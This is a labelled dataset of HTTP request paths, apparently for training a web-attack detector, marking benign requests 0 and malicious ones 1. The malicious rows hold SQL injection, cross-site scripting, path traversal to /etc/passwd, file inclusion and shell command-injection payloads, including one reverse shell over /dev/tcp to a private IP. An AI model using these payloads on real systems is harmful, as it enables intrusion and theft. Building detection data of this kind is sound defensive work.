request	label
"/ 8t9v8k7x . dll ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ string / strings / parameters = < iframe onload = popup = 1 ;  > 	1
/ string / strings / parameters = 1 '  )  and 7756 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  ' lnte '  =  ' lnte 	1
/ examples / jsp / checkbox / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc 	1
/ string / modo = insertar & precio = 8457 & b1 = pasar + por + caja 	0
/ string / strings / parameters = !  [ a ]  ( data : text / html ; base64 , phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k )  \ 	1
/ click-tracking / 	0
/ string / strings / parameters = clavero lloveras 	0
/ string / strings / parameters = stapley @ cirugiaplasticacordoba . jm 	0
/ telephone_skype / 	0
/ system / admin / include / upload_form . php ? globals = xxpathxx 	1
/ string / modo = registro & login = dyment & password = ma724-3ra & nombre = mirko & apellidos = castells + rel & email = daughtry @ thecupidhouse . az & dni = 07951538r & direccion = calle + tulipanes + 151 ,  + 9 ? d & ciudad = sant + mart + d ' albars & cp = 03134 & provincia = palencia & ntc = 8648898617825850 & b1 = registrar 	0
/ string / strings / parameters = ladronzue_lo 	0
/ pr20011115b / 	0
/ string / strings / parameters = 7r6d54ti450 	0
"/ string / strings / parameters = ""  >  < svg / onload "" "	1
/ string / strings / parameters = |   [  2 -ne  $  ( echo mydvjm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
"/ string / modo = registro & login = beatriz & password = m9n87d90 & nombre = luciliano & apellidos = arlat + poma & email = pezzotta-castella @ artesania . org . nc & dni = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  )  & direccion = calle + kadiga + 91 +  & ciudad = bobadilla & cp = 31750 & provincia = barcelona & ntc = 4154281799426251 & b1 = registrar "	1
/ string / modo = entrar & login = matheson4 & pwd = f3ac76025 & remember = off & b1 = entrar 	0
/ cgi-bin / include / sql . php ? include_path =  / etc / passwd \ x00 	1
/ string / strings / parameters = ;  str =  $  ( echo ybrdji )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ sl-7600 / 	0
/ examples / jsp / cal / engine / admin / admin . php ? id_user =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ search99 / 	0
/ string / strings / parameters = methi 	0
/ string / strings / parameters = carretera de ribadesella a canero 68 10-g 	0
/ string / strings / parameters = 1 '  )  )  ; select case when 7717 = 7717 then 1 else null end -- 	1
"/ string / strings / parameters = 1 ""  ""  where 2878 = 2878 union all select null , null , null , null , null # "	1
/ dfrwsfinal / 	0
/ string / modo = entrar & login = sydeman6 & pwd = 0nc / on / 6it , ar & remember = on & b1 = entrar 	1
/ string / strings / parameters = c /  rio agreira 91 	0
/ string / strings / parameters = 4743 	0
"/ 0w155a7c . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = brendel @ esposo . com . lk 	0
/ javascript / submissions . exe 	1
/ examples / jsp / jsp2 / jspx / bemarket / shop / index . php ? pageurl = viewpage & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ u8yiqilu . jspa ?  < meta http-equiv = set-cookie content =  "" testswjp = 6010 ""  > "	1
/ weblog expert by norouzi / 	0
"/ en-us / 33y9gcqq . kspx ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
"/ string / strings / parameters = xxxxx ` perl -e  ' print  ""  .  % p ""  x 80 '  ` "	1
/ javascript / club . bak 	0
"/ string / str =  $  ( echo zsoawg )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ string / modo = registro & login = hurwitz & password = p7rdulario & nombre = yasmila & apellidosa = raquer + de + la + poza & email = kober @ sindns . ve & dni = 24117332s & direccion = calle + barri + trinitat + nova ,  + s / n ,  + 13d & ciudad = parra + de + las + vegas ,  + la & cp = 12709 & provincia = len & ntc = 1828745224462815 & b1 = registrar 	1
/ celebrity-gear / 	0
/ q45573811 	0
/ javascript / ingress . dump 	0
"/ main . php ? stuff =  ""  & uname \ x09 > q71999354 \ x09 # "	1
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo ygeokn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
"/ yver8r9o . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ biosensors / 	0
/ string / modo = registro & login = pojanart & password = 2ic15 & nombre = amando & apellidos = mompart + anglaril & emaila = parente @ espaciopintor . ro & dni = 65049815l & direccion = plza .  + pablo + picasso + 198 + 4-c & ciudad = villamoronta & cp = 03517 & provincia = teruel & ntc = 8000827068875110 & b1 = registrar 	1
"/ en-us / ddoworrl . exe ?  < meta http-equiv = set-cookie content =  "" testvlau = 8517 ""  > "	1
/ string / strings / parameters = minako 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' frrk '  from dual where 3145 = 3145 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  ' 	1
/ main . php ? stuff =  '  \ x0ddel q65565224  # 	1
/ string / strings / parameters = 1 %  '  )  )  )  or 7417 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ string / strings / parameters = vilalba sasserra 	0
/ 1720086 / 	0
/ javascript / restored . bat 	0
/ javascript / sendto . swf 	0
/ javascript / bottom . trace 	0
"/ top . php ? stuff =  ""  \ x0adel q63768352  # "	1
/ string / modo = entrar & login = vasilopo & pwd = ladronzue_lo & remember = off & b1 = entrar 	0
/ 000045225 / 	0
"/ l752x1ry . aspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ h5i6crm3 . dll ?  < meta http-equiv = set-cookie content =  "" testlihk = 7070 ""  > "	1
/ string / strings / parameters = calle guatemala 12 11c 	0
/ string / strings / parameters = '  |  | echo $ ifsblppxu $  (  ( 2 + 17 )  )  $  ( echo $ ifsblppxu ) blppxu | 	1
/ cgi-915 / netpad . cgi 	0
/ javascript / soapmonitor . tmp 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / modo = registro & login = somppi & password = paparote & nombre = juliana & apellidos = vilardaga + bedmar & email = gardner-zimmer @ alfombra . com . in & dni = 79288923b & direccion = vitoria ,  + 185 + 3 ? a & ciudad = bahabn & cp = 17464 & provinciaa = vizcaya & ntc = 6889929680639431 & b1 = registrar 	1
/ string / strings / parameters = ciadoncha 	0
/ index2_el / 	0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 22 . 202 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
/ examples / jsp / num / sawmill6cl . exe ? ho +  { complete_version } 	1
/ 123flashchat . php ? e107path = xxpathxx 	1
/ javascript / properties . htm 	0
/ 49978_wallpaper110 / 	0
/ string / str =  $  ( echo osxami )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
"/ jnt3f86c . htm ?  < script > document . cookie =  "" testcmax = 9270 ;  ""  <  / script > "	1
/ string / strings / parameters = kurian 	0
/ nuke-test / 	0
/ mahou_shoujotai / 	0
"/ string / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ 147120 / 	0
/ zaposlenje / 	0
/ gaceta / 	0
/  .  /  \  /  .  /  .  /  \  /  .  /  { file } 	1
/ javascript / snoop . mdb 	0
/ 1768889088 / 	0
"/ string / strings / parameters = < video src =  "" x ""  onloadstart =  "" alert ( 1 )  ""  > "	1
/ javascript / log4net . bin 	0
/ firewall_qa / 	0
/ javascript / digg . cfm 	0
/ javascript / click . jar 	0
/ javascript / staff . php3 	0
/ string / strings / parameters = fadlalla 	0
/ string / strings / parameters = soussa 	0
/ examples / jsp / sessions / sql . php3 ? lib_inc = 1 & btndrop = no & goto =  / etc / passwd 	1
/ string / strings / parameters = c /  cornudella del montsant 142 ,  5 ? b 	0
/ wireless_tco / 	0
/ string / strings / parameters = '  ; echo zdxlmm $  (  ( 81 + 23 )  )  $  ( echo zdxlmm ) zdxlmm ' 	1
/ cgi-bin / cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = <  !  --  [ if < img src = x onerror = alert ( 2 )  /  /  ]  >   --  >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ 3animationthumb / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qtrmrj )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / strings / parameters = hundley @ evelin . com . pf 	0
/ string / strings / parameters = 1 %  '  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = obscurantismo 	0
/ adcycleb / 	0
/ string / id = 1 /  & nombre = queso + manchego & precio = 39 & cantidad = 26 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = order by 23 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kzpzzi )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ fw_tnef-1 / 	0
/ examples / jsp / colors / index . php ? action = view & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = c /  cardenal cisneros 70 ,  12 ? d 	0
/ 021205-tele / 	0
/ string / str =  $  ( echo uvfukr )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ string / strings / parameters = villalba de los barros 	0
/ string / strings / parameters = 12466 	0
/ transact_bus / 	0
/ isaret-mavi / 	0
/ citrix / metaframexp / default / login . asp ? nfuse_logoutid =  & nfuse_messagetype = error & nfuse_message =  < script > alert (  ' ritchie '  )  <  / script >  & clientdetection = on 	1
/ string / strings / parameters = 97co38225s9 	0
/ htbin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ index . php ? c = access & a = login & ref_c = nessus ""  >  < script > alert ( 624246618 )  <  / script >  & ref_a = projectpier_login_page_xss . nasl ""  >  < script > alert ( 251808778 )  <  / script > "	1
/ examples / jsp / cal / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd 	1
/ string / strings / parameters = gdowik2 	0
/ manager / zml . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ byrg33fw . php ?  < script > document . cookie =  "" testexuu = 5340 ;  ""  <  / script > "	1
/ oneadmin / config-bak . php ? include_once = xxpathxx 	1
/ string / strings / parameters = bielat 	0
/ script / ident / loginliste . php ? path_inc = xxpathxx 	1
/ javascript / admin . old 	0
"/ 3j8echh0 . exe ?  < script > document . cookie =  "" testfuqi = 4189 ;  ""  <  / script > "	1
/ wheelman ' s - bushpig / 	1
"/ help . php ? q =  ""  & del , q45293431 & rem , "	1
"/ main . php ? stuff =  "" ver \ xa0 > q33347165 & rem \ xa0 "	1
"/ en-us / 9kr0ih0v . php ?  < script > document . cookie =  "" testzgnm = 1183 ;  ""  <  / script > "	1
/ string / strings / parameters = |  | echo pntmbc $  (  ( 8 + 17 )  )  $  ( echo pntmbc ) pntmbc \  \ 	1
/ string / strings / parameters = 28590 	0
"/ string / strings / parameters = ""  |   [  5 -ne  $  ( echo cinwsa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
/ statehood / 	0
/ william_seward / 	0
/ examples / servlets / servlet / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1738276559 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ fact_jioc / 	0
/ string / strings / parameters = 1 %  '  )  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  # 	1
/ 2886456700025838372pxqvxl_th / 	0
"/ string / strings / parameters = >  ""  ""  < script  < b > document . cookie = true ;  <  / script > "	1
/ goldfrapp / 	0
/ string / strings / parameters = 1 where 7522 = 7522 and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  -- 	1
/ string / strings / parameters = 1 '  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  ' eaxu '  =  ' eaxu 	1
/ string / strings / parameters = calle oxigeno 197 	0
"/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  "" vj \ 0001j \ 0002 \ 0211 \ 0341j \ 0001jfx \ 0133 \ 0315 \ 0200 \ 0222 ""   >  >   / tmp / xmefwyizyj0 ; echo | awstats649475 . txt "	1
/ string / modo = entrar & login = hatti & pwd = c ' 90b170a & remember = off & b1 = entrar 	1
/ string / strings / parameters = 0908272174397466 	0
/ string / strings / parameters = 8460 	0
/ string / modo = registro & login = fullum6 & password = 5honde & nombre = pacfica & apellidos = fonterosa + vjar & email = crast_litel @ cortell . al & dni = 68689912k & direccion = conde + de + olocau ,  + s / n ,  + 3g & ciudad = oliva & cp = 45939 & provincia = len & ntc = 9783618046984809 & b1 = registrar 	0
/ 2007fellows / 	0
/ 049396 / 	0
/ string / strings / parameters = 7012769883161832 	0
/ string / strings / parameters = 12001090n 	0
/ string / modo = registro & login = waneta & password = ar $ a & nombre = luis + mara & apellidos = clar + degomis & email = focas @ programaciones . com . sz & dni = 25254382z & direccion = calle + doctor + ruiz + de + la + herran ,  + s / n ,  + 7b & ciudad = hormilla & cp = 09191 & provincia = lugo & ntc = 2869539552329733 & b1 = registrar 	0
/ mcafeefirewal / 	0
/ string / strings / parameters = 7013 	0
/ berlin part 2 / 	0
"/ string / strings / parameters = -3525 ""  ""  where 3522 = 3522 union all select 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 , 3522 # "	1
/ string / strings / parameters = pinilla del valle 	0
/ javascript / document . txt 	1
/ software_retailers / 	0
/ javascript / hole . error 	0
/ string / strings / parameters = $  {  @ print ( system ( â�œwhoamiâ��? )  )  } 	1
/ y2h2n7 / 	0
/ string / strings / parameters = lantarn 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as sqow where 8752 = 8752 ; select  ( case when  ( 1726 = 4080 )  then 1726 else 1 /  ( select 0 )  end )  -- "	1
/ adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  / 	1
/ 134225 / 	0
/ ocp-103 / index . php ? req_path = xxpathxx 	1
/ javascript / showthread . exe 	1
/ string / strings / parameters = < style / onload =  & lt ;  !  --  &  # 09 ;  & gt ;  &  # 10 ; confirm &  # 10 ;  & lpar ; 1 & rpar ;  > 	1
/ string / modo = registro & login = basco & password = sopista & nombre = rory & apellidos = aimar + taulats & email = cotts @ normatic-vending . gn & dni = 71997567t & direccion = c /  + salvador + 64 ,  + 5c & ciudad = quintanilla + de + urz & cp = 49145 & provincia = salamanca & ntc = 5714357879809256 & b1 = registrar 	0
/ string / strings / parameters = '  echo doxqvc $  (  ( 74 + 61 )  )  $  ( echo doxqvc ) doxqvc | 	1
/ string / strings / parameters = zunuzi 	0
/ top_promo2 / 	0
/ companies_discussed / 	0
/ javascript /  ~ log . log 	0
/ string / modo = registro & login = morrie & password = epa & nombrea = erlan & apellidos = sordo + alquinta & email = nieva @ menorca . com . sz & dni = 22787443d & direccion = pl .  + de + la + palomera ,  + s / n + 2 ? d & ciudad = oss + de + si & cp = 31353 & provincia = badajoz & ntc = 5124736256894307 & b1 = registrar 	1
/ string / strings / parameters = 7znallo 	0
/ string / strings / parameters = 12182 	0
/ classifieds / index . php ? lowertemplate = xxpathxx 	1
/ technology_planet / 	0
/ chlopcy z placu broni - gold / 	0
/ en-us / account / resetpw . php ? email =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ templates / default / index_logged . php ? main_loaded = 1 & cur_module = xxpathxx 	1
/ 000024486 / 	0
/ javascript / httpd . rar 	0
/ juanita / 	0
/ ptopic17747 / 	0
/ news / include / createdb . php ? langfile ;  =  @ rfiurl ? langfile ;  =  @ rfiurl ? 	1
/ string / strings / parameters = '  ;  waitfor delay  ' 0 : 30 : 0 '  -- 	1
/ examples / jsp / checkbox / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_inohuydx ]  )  )  ; die ;  /  * 	1
/ c27v56ykzfpc8j2z3g / 	0
/ niet1793285453 . 	0
"/ x2gyorli . idc ?  < meta http-equiv = set-cookie content =  "" testwhac = 3130 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  as ifgl where 2190 = 2190 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  -- "	1
/ 10000003234 / 	0
/ travel-accessories / 	0
/ rws990 / 	0
/ projects / 1 / repository / annotate ? rev =  ` 0 <  & 208- ; exec 208 <  >  / dev / tcp / 192 . 168 . 202 . 118 / 26475 ; sh  <  & 208  >  & 208 2 >  & 208 ` 	1
/ javascript / dcforum . htm 	0
"/ uvazfs7p . jspa ?  < script > document . cookie =  "" testwtbo = 4831 ;  ""  <  / script > "	1
/ string / b2 =  | 	1
/ string / strings / parameters = 1 %  '  )  )  union all select null , null , null , null , null , null # 	1
/ string / strings / parameters = ;  str =  $  ( echo ewygbo )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
"/ g3w7y7u5 . html ?  < script > document . cookie =  "" testbfpq = 3326 ;  ""  <  / script > "	1
/ string / strings / parameters = calle cosidores ,  s / 	0
/ string / strings / parameters = <  / svg : mask > 	1
/ icon_emarket / 	0
"/ vwmg565s . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = tiong-ho & password = an1l5m9no & nombre = hadasa & apellidos = subias & email = parada . biuchet4 @ aulahost . gw & dni = 79845869n & direccion = jacinto + benavente ,  + 165 + 7f & ciudad = herreruela & cp = 11330 & provincia = teruel & ntc = any  set-cookie :  + tamper = 5765205567234876235 & b1 = registrar 	1
/ 1163871338580 / 	0
"/ 169okeyj . php ?  < meta http-equiv = set-cookie content =  "" testxeoi = 3573 ""  > "	1
/ p8100629-prev / 	0
/ string / id = 2 & nombre = queso + manchego & precio = 85 & cantidad = 98 & b1 = aadir + al + carrito 	0
